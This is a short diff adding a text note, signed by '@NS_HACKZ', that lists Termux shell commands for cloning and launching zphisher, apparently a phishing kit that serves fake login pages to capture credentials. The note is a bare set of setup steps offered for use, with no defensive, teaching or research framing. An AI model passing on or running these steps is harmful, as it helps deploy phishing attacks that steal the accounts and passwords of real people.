@@ -1,0 +1,12 @@
+CMDS FOR TERMUX
+
+termux-setup-storage
+y
+pkg install git
+git clone https://github.com/htr-tech/zphisher
+chmod +x zphisher
+ls
+cd zphisher
+bash zphisher.sh
+
+OFFICIALLY BY @NS_HACKZ
